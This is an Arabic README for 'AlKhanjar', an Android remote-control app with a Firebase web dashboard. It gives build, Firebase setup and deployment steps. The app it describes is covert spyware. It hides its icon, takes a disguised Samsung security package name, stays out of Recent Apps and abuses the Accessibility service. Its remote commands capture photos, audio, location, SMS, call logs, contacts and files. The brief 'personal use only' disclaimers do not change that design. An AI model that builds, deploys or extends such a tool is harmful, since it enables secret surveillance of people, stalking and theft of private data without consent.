# 🔱 AlKhanjar Device Manager

## نظام إدارة الأجهزة الاحترافي الكامل

مشروع متكامل لإدارة أجهزة Android عن بعد باستخدام Firebase.

---

## 📦 مكونات المشروع

```
alkhanjar-complete/
├── android-app/          # تطبيق Android (APK)
├── web-dashboard/        # لوحة التحكم Web
└── backend-server/       # خادم Backend (اختياري)
```

---

## 🚀 البناء والتثبيت

### 1️⃣ بناء التطبيق على الكمبيوتر (مُوصى به)

```bash
cd android-app
./gradlew assembleDebug
```

الملف الناتج: `android-app/app/build/outputs/apk/debug/app-debug.apk`

### 2️⃣ بناء التطبيق على Termux

```bash
# تثبيت المتطلبات
pkg update && pkg upgrade
pkg install openjdk-17 gradle

# ضبط JAVA_HOME
export JAVA_HOME=/data/data/com.termux/files/usr/opt/openjdk

# البناء
cd android-app
chmod +x gradlew
./gradlew assembleDebug --no-daemon --max-workers=2
```

**ملاحظة:** البناء على Termux قد يستغرق 15-30 دقيقة!

### 3️⃣ تثبيت APK على الهاتف

```bash
# نقل الملف للهاتف
adb push app/build/outputs/apk/debug/app-debug.apk /sdcard/

# أو رفعه على Drive/Telegram ثم تحميله
```

---

## ⚙️ إعداد Firebase

### الخطوة 1: قاعدة البيانات

افتح Firebase Console:
```
https://console.firebase.google.com
```

1. اختر المشروع: `hmooude-37c70`
2. انتقل إلى **Realtime Database**
3. اضبط القواعد:

```json
{
  "rules": {
    ".read": true,
    ".write": true
  }
}
```

**⚠️ تحذير:** هذه القواعد للتطوير فقط! استخدم مصادقة في الإنتاج.

### الخطوة 2: التخزين (Storage)

1. فعّل **Firebase Storage**
2. اضبط القواعد:

```
service firebase.storage {
  match /b/{bucket}/o {
    match /{allPaths=**} {
      allow read, write: if true;
    }
  }
}
```

---

## 🌐 تشغيل لوحة التحكم

### طريقة 1: فتح مباشر

```bash
cd web-dashboard
# افتح index.html في المتصفح
```

### طريقة 2: خادم محلي

```bash
# Python
python3 -m http.server 8080

# أو PHP
php -S localhost:8080

# ثم افتح: http://localhost:8080
```

### طريقة 3: استضافة على الإنترنت

**رفع على Firebase Hosting:**

```bash
npm install -g firebase-tools
firebase login
firebase init hosting
firebase deploy
```

**أو رفع على Netlify/Vercel مجاناً**

---

## 📱 استخدام التطبيق

### أول تشغيل:

1. ✅ ثبّت التطبيق
2. ✅ افتحه للمرة الأولى
3. ✅ اقبل جميع الصلاحيات
4. ✅ فعّل خدمة Accessibility
5. ✅ أوقف تحسين البطارية
6. ✅ سيختفي التطبيق تلقائياً

### الوصول للتطبيق مجدداً:

اطلب الكود السري من لوحة الاتصال:

```
*#*#2026#*#*
```

---

## 🎮 الأوامر المتاحة

### 📍 الموقع الجغرافي
- `get_location` - الحصول على الموقع الحالي

### 📸 الكاميرا والوسائط
- `capture_photo` - التقاط صورة (front/back)
- `record_audio` - تسجيل صوت
- `take_screenshot` - لقطة شاشة

### 📂 الملفات
- `list_files` - عرض الملفات
- `download_file` - تحميل ملف
- `upload_file` - رفع ملف

### 📞 المكالمات والرسائل
- `get_call_logs` - سجل المكالمات
- `get_sms` - الرسائل النصية
- `get_contacts` - جهات الاتصال

### ⚙️ النظام
- `get_installed_apps` - التطبيقات المثبتة
- `get_device_info` - معلومات الجهاز

---

## 🔧 هيكل قاعدة البيانات Firebase

```
firebase-database/
├── devices/
│   └── {deviceId}/
│       ├── deviceModel
│       ├── androidVersion
│       ├── status (online/offline)
│       ├── batteryLevel
│       ├── networkType
│       ├── latitude
│       ├── longitude
│       └── lastSeen
│
├── commands/
│   └── {deviceId}/
│       └── {commandId}/
│           ├── commandType
│           ├── parameters
│           ├── timestamp
│           └── executed
│
└── responses/
    └── {deviceId}/
        └── {commandId}/
            ├── success
            ├── data
            └── timestamp
```

---

## 🛠️ استكشاف الأخطاء

### خطأ البناء: "AAPT2 error"

```bash
# حل 1: استخدم Gradle أقدم
./gradlew assembleDebug --no-daemon

# حل 2: عطّل AAPT2
# أضف في build.gradle:
android.buildFeatures.aapt2 = false
```

### خطأ: "Out of memory"

```bash
# زد الذاكرة في gradle.properties:
org.gradle.jvmargs=-Xmx3072m
```

### التطبيق يتعطل عند التشغيل

1. تحقق من الصلاحيات
2. راجع Logcat:
```bash
adb logcat | grep AlKhanjar
```

### الجهاز لا يظهر في لوحة التحكم

1. ✅ تأكد من اتصال الإنترنت
2. ✅ راجع إعدادات Firebase
3. ✅ تحقق من عمل الخدمة:
```bash
adb shell dumpsys activity services | grep CoreService
```

---

## 🔐 الأمان

### التشفير

- ✅ AES-256 للبيانات الحساسة
- ✅ ProGuard لتشويش الكود
- ✅ مفاتيح Firebase مشفرة

### الإخفاء

- ✅ إخفاء الأيقونة تلقائياً
- ✅ اسم حزمة مموّه (com.samsung.android.security.v8)
- ✅ لا يظهر في Recent Apps

### الحماية

⚠️ **للاستخدام الشخصي فقط!**
- استخدمه فقط على أجهزتك
- لا تستخدمه ضد الآخرين
- قد يكون غير قانوني في بعض الدول

---

## 📊 الأداء

- **حجم APK:** ~15-20 MB
- **استهلاك RAM:** ~50-100 MB
- **استهلاك البطارية:** منخفض (< 5% يومياً)
- **استهلاك البيانات:** ~1-5 MB يومياً

---

## 🔄 التحديثات

### إضافة ميزات جديدة:

1. أضف Handler جديد في `/handlers`
2. سجّل الأمر في `CommandHandler.java`
3. أضف الزر في `web-dashboard/index.html`

### مثال: إضافة ميزة جديدة

```java
// في CommandHandler.java
case "my_command":
    handleMyCommand(command, callback);
    break;

private void handleMyCommand(Command command, CommandCallback callback) {
    // الكود هنا
    callback.onSuccess("تم التنفيذ");
}
```

---

## 📞 الدعم

### الأسئلة الشائعة

**س: هل يعمل على Android 15؟**  
ج: نعم! يدعم Android 10-15

**س: هل يحتاج Root؟**  
ج: لا! يعمل بدون Root

**س: كم من الوقت يستغرق البناء؟**  
ج: 5-10 دقائق (كمبيوتر) أو 15-30 دقيقة (Termux)

**س: هل يمكن استخدامه على أكثر من جهاز؟**  
ج: نعم! كل جهاز يظهر بشكل منفصل في لوحة التحكم

---

## ⚖️ إخلاء المسؤولية

هذا المشروع **للأغراض التعليمية** ولإدارة أجهزتك الشخصية فقط.

- ❌ لا تستخدمه ضد أجهزة الآخرين بدون إذن
- ❌ قد يكون غير قانوني في بعض الدول
- ✅ استخدمه بمسؤولية
- ⚠️ أنت المسؤول عن أي استخدام

---

## 📜 الترخيص

MIT License

---

## 🇸🇾 صُنع في سوريا

**صُنع بـ ❤️ في دير الزور، سوريا**

---

## 📝 ملاحظات إضافية

### الملفات المهمة:

```
android-app/
├── app/
│   ├── build.gradle (إعدادات المشروع)
│   ├── google-services.json (Firebase)
│   ├── proguard-rules.pro (الحماية)
│   └── src/main/
│       ├── AndroidManifest.xml (الصلاحيات)
│       └── java/.../
│           ├── AlKhanjarApp.java (التطبيق الرئيسي)
│           ├── MainActivity.java (النشاط الرئيسي)
│           ├── services/
│           │   └── CoreService.java (الخدمة الأساسية)
│           ├── handlers/
│           │   └── CommandHandler.java (معالج الأوامر)
│           └── utils/
│               └── FirebaseManager.java (إدارة Firebase)
```

### البناء للإصدار (Release):

```bash
./gradlew assembleRelease
```

ثم وقّع APK باستخدام Android Studio أو:

```bash
jarsigner -keystore my-key.keystore app-release-unsigned.apk my-key-alias
zipalign -v 4 app-release-unsigned.apk app-release.apk
```

---

**نهاية الدليل** ✅
